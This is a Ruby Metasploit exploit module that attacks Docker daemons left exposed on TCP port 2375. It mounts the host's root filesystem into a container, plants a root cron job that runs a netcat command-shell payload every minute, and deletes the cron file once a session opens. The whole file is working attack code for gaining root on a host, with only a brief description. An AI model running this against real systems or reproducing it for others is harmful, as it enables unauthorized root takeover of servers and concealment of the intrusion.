require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Docker daemon',
      'Description' => %q{
       This module exploits the unprotected docker daemon. Run check() first
      to list the images and set the var.
      },
      'Author' => [ 'Mario Ceballos' ],
      'License' => 'BSD_LICENSE',
      'References' =>
        [
          [ 'URL', 'http://' ],
        ],
      'Privileged' => true,
      'Platform'   => 'unix',
      'Arch'       => ARCH_CMD,
      'Payload'    =>
        {
          'Compat'      =>
                 {
                    'PayloadType' => 'cmd',
                    'RequiredCmd' => 'generic netcat',
                 }
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Oct 2 2019')) # the module. 

      register_options(
        [
         Opt::RPORT(2375),
         OptString.new('IMAGEID', [ true, "The image id.", ""]),
      ])

  end

   def on_new_session(client)
     
     if client.type == "shell"
          client.shell_write("rm -rf /etc/cron.d/MCTMP\n")
     end

  end

  def cli_loaded

   paths = Array.new

   wtf = ENV['PATH'].split(":").each do |x|
    paths << x
   end

   paths.each do |y|
    if File.exists?(y + "/docker") == true
      @dockercli = y + "/docker"
    end
   end
  
  end

  def check

   cli_loaded()

   data = Array.new

   print_status("Getting system images")
   res = `#{@dockercli} -H tcp://#{datastore['RHOSTS']} images`
    res.each_line do |x|
      data << x
    end
      
   if data.size > 1
     puts data
    return CheckCode::Appears
    else
   end

  end
  
  def exploit

   cli_loaded()
   
   mc = "* * * * * root #{payload.raw}"

   all = "sh -c \"echo '#{mc}' > /MCTMP/etc/cron.d/MCTMP\""

   print_good("Mounting '#{datastore['IMAGEID']}'. Executing final payload...")
   system("#{@dockercli} -H tcp://#{datastore['RHOSTS']}:#{datastore['RPORT']} run -it -v /:/MCTMP '#{datastore['IMAGEID']}' #{all}")
   Rex.sleep(60)
   handler

  end

end
